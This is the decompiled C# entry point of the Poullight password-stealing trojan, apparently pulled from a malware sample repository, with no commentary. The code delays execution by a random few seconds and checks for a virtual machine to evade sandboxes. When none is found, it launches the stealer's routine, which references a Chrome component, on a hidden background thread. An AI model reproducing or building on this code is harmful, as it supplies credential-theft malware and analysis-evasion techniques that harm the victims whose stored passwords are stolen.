// Decompiled with JetBrains decompiler
// Type: EntryLoader.EntryPoint
// Assembly: Poullight, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A9555FC6-4E86-4D22-9A29-AD3955B2BC52
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\Trojan-PSW.MSIL.Poul.gen-67cfa95ccaa06c437e04f38c3ef890986c1885c61636b84bf51d16b0d7bf957c.exe

using System;
using System.Threading;

namespace EntryLoader
{
  internal class EntryPoint
  {
    protected static Starter run = new Starter();
    public static Chrome chrome = new Chrome();
    public static bool close = true;
    public static string key = "";
    public static bool activation = false;

    public static void activate_check()
    {
      try
      {
        EntryPoint.activation = false;
      }
      catch
      {
      }
    }

    public static int Main(string[] args)
    {
      Thread.Sleep(new Random().Next(3, 5) * 1000);
      EntryPoint.activate_check();
      if (!AntiVM.CheckVM())
      {
        EntryPoint.close = false;
        Thread thread = new Thread(new ThreadStart(EntryPoint.run.Start));
        thread.IsBackground = true;
        thread.SetApartmentState(ApartmentState.STA);
        thread.Start();
      }
      while (true)
      {
        while (!EntryPoint.close)
          Thread.Sleep(1000);
        Environment.FailFast("Program has been crashed");
      }
    }
  }
}
